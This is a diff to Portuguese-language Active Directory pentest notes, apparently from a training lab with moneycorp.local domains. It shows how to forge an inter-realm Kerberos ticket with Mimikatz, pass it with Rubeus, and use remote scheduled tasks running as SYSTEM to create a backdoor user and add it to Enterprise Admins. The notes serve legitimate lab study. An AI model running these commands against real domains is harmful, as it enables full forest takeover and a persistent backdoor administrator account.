@@ -3130,8 +3130,10 @@ rc4_hmac_nt       c4bb6612585cac1e66c606f281f95a21
 get-netgroup -fulldata -GroupName "Enterprise Admins" -Domain moneycorp.local
 get-netgroup -fulldata -GroupName "Enterprise Admins" -Domain moneycorp.local | select samaccountname,objectsid
 ```
-Exemplo: Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-280534878-1496970234-700767426)
-	
+Exemplo: 
+```
+Enterprise Admins S-1-5-21-280534878-1496970234-700767426-519
+```	
 4. MIMIKATZ - CRIAR UM TICKET INTER-REALM TGT
 ```
 Kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e6b82e5d09e03817aab44dc809ded34a /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\trust_tkt.kirbi
@@ -3140,7 +3142,22 @@ Kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-321
 ```
 .\Rubeus.exe asktgs /ticket:C:\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
 ```
-ou
+EXTRA:
+APROVEITAR E PEGAR TICKET DE HOST PARA CRIAR TAREFAS AGENDADAS NO DOMINIO RAIZ:
+```
+.\Rubeus.exe asktgs /ticket:C:\trust_tkt.kirbi /service:host/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
+```
+CRIAR TAREFAS AGENDADAS PARA ACESSAR COMO ENTRERPRISE ADMIN
+```
+schtasks /create /S mcorp-dc.moneycorp.local /SC WEEKLY /RU "NT Authority\SYSTEM" /TN "PENTESTER1" /TR "net user /add pentester 123qwe.. /domain"
+schtasks /RUN /S mcorp-dc.moneycorp.local /TN "PENTESTER1"
+schtasks /create /S mcorp-dc.moneycorp.local /SC WEEKLY /RU "NT Authority\SYSTEM" /TN "PENTESTER2" /TR "net group 'Enterprise Admins' pentester /add /domain"
+schtasks /RUN /S mcorp-dc.moneycorp.local /TN "PENTESTER2"
+```
+ACESSAR COMO ENTRERPRISE ADMIN
+```
+enter-pssession -computername mcorp-dc.moneycorp.local -credential  pentester@moneycorp.local
+```
 	
 5. KEKEO OLD - SOLICITAR O TGS PARA SERVIÇO DO DOMAIN CONTROLLER (CIFS NO DOMAIN CONTROLLER)
 ```
